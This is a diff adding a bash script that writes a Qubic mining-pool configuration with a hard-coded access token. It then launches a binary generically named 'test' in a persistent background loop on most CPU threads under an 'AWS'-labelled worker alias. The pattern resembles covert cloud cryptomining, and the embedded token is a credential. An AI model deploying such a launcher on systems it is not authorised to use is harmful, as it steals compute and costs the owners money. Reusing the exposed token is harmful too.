@@ -1,0 +1,21 @@
+#!/bin/bash
+thread=$(nproc --all)
+thread=$((thread-1))
+WORKER=$(echo $(date +%H))
+export thread
+export WORKER
+rm -rf appsettings.json
+cat <<EOF>> appsettings.json
+{
+  "Settings": {
+    "baseUrl": "https://mine.qubic.li/",
+    "amountOfThreads": $thread,
+    "payoutId": null,
+    "accessToken": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJJZCI6IjY4NmQ5NTRmLThjMjQtNDkwZi1hMDI0LWExOGY4MTQwNWVjZiIsIk1pbmluZyI6IiIsIm5iZiI6MTcyMjA3NzQ3NCwiZXhwIjoxNzUzNjEzNDc0LCJpYXQiOjE3MjIwNzc0NzQsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.FIzsFR0nKzz3RFTprOx56TirGNK5sacl30TzbBzgDu3lnIM2sNJLEYW5mmBjjf6YYM1o79UJI8bo6OYsCOimTQ",
+    "alias": "AWS-$WORKER"
+  }
+}
+
+EOF
+
+pgrep -x test >/dev/null && echo "Process found" || nohup bash -c 'for i in {1..99999}; do ./test; done' > program.out 2>&1 &
